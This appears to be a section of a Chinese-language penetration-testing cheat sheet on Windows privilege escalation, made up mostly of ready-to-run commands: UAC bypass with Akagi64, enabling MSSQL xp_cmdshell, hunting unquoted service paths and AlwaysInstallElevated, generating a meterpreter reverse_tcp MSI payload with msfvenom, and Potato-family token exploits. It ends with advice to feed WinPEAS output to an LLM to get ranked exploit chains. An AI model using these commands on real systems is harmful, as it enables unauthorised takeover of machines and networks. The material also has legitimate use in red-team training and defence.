## 五、Windows权限提升

### 5.1 BypassUAC
```
# 场景: 本地管理员账号但UAC限制(高权限命令被拦)
# 手法: IFileOperation COM / eventvwr.exe注册表劫持 / sdclt.exe /
#       SilentCleanup(磁盘清理任务) / cmstp.exe / 环境变量劫持高权限.NET程序
# 工具: UACME(Akagi64) / SharpBypassUAC / Bypass-UAC(FuzzySecurity)
UACME\Akagi64.exe 23                                # 常用UAC绕过payload编号
```

### 5.2 内核漏洞提权
```
# 依据systeminfo补丁列表 → 匹配未修补CVE
# 常用: CVE-2020-1472(Zerologon,域控) / CVE-2021-21551(dell驱动) /
#       PrintNightmare CVE-2021-34527(打印服务) / CVE-2022-21999(SpoolFool)
# 工具集: Kernelhub / Windows-Exploits / windows-exploit-suggester
python windows-exploit-suggester.py -d 2021-01-01-db -i systeminfo.txt
```

### 5.3 服务与数据库提权
```
# 数据库提权(内网高发)
# MSSQL: sa弱口令 → xp_cmdshell / CLR / 代理作业
EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE
EXEC master..xp_cmdshell 'whoami'
# MySQL: UDF提权(需写权限+plugin目录) / 日志getshell / 弱口令
# Oracle: oracleShell / JavaSource(高权限DBMS_JAVA)
# 工具: SharpSQLTools / MDUT / Sylas
# 服务配置提权
# 可写服务路径 → 替换服务二进制/放恶意DLL
wmic service get name,pathname | findstr /i "c:\\program files"
# 未引号服务路径
wmic service get name,pathname | findstr /v "C:\\Windows\\system32" | findstr /v /i "c:\\program"
# 可写注册表服务键 / 可写文件路径服务
```

### 5.4 错误配置提权
```
# 可写文件/文件夹 + SYSTEM运行的服务
icacls "C:\Program Files\xxx"                # Everyone:(F) 等
# 计划任务可写脚本
schtasks /query /fo LIST /v | findstr /i "task run as"
# 任意用户以SYSTEM安装MSI(AlwaysInstallElevated)
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msfvenom -p windows/x64/meterpreter/reverse_tcp -f msi -o evil.msi
# 服务令牌提升 SeImpersonatePrivilege(见5.5)
```

### 5.5 Potato家族提权（SeImpersonatePrivilege）
```
# whoami /priv 查看: SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege → Potato
# Windows Server 2016/2019 + 高版本: PrintSpoofer / GodPotato / EfsPotato / SweetPotato
# (RottenPotato/JuicyPotato已不适用于新系统)
PrintSpoofer.exe -i -c cmd.exe
GodPotato -cmd "cmd /c whoami"
# 域控提权漏洞(CVE): noPac(CVE-2021-42278/42287) / Zerologon(CVE-2020-1472) 见第八章
```

### 5.6 提权自动化与AI辅助
```
# 自动枚举: WinPEAS / PowerUp / PrivescCheck / BeRoot
winpeas.exe quiet
. .\PowerUp.ps1; Invoke-AllChecks
# AI辅助: 把WinPEAS输出粘贴给LLM → 让它按可利用性排序并给出利用链
```

